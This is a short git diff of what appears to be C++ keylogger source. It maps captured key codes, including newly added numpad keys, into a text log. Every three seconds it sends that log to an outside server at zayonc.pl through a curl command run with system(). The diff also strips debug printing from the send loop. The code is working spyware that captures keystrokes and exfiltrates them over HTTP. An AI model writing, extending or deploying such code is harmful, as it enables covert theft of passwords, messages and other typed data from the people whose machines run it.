@@ -6,6 +6,8 @@
 #include <iomanip>
 #include <sstream>
 #include <ctime>
+#include <thread> 
+
 
 using namespace std;
 
@@ -71,15 +73,17 @@ string parseToString(char key) {
 		return parsed;
 	else if (key >= 48 && key <= 90)
 		parsed += key;
+	else if (key >= 96 && key <= 105)
+		parsed += (key - 48);
 	else if (key >= 112 && key <= 123) {
 		parsed += "#F";
+
 		if (key <= 120)
 			parsed += (key - 63);
 		else {
 			parsed += '1';
 			parsed += (key - 73);
 		}
-		
 		parsed += '#';
 	}
 
@@ -132,12 +136,8 @@ int main()
 			}
 		}
 
-		cout << time(NULL) << ", " << lastUpdate << ", " << time(NULL) - lastUpdate << "\n";
-
 		if (time(NULL) - lastUpdate >= 3) {
 			string req = "curl http://zayonc.pl:3011/log?log=" + url_encode(log);
-
-			cout << 'send';
 
 			if (!system(req.c_str())) {
 				time(&lastUpdate);
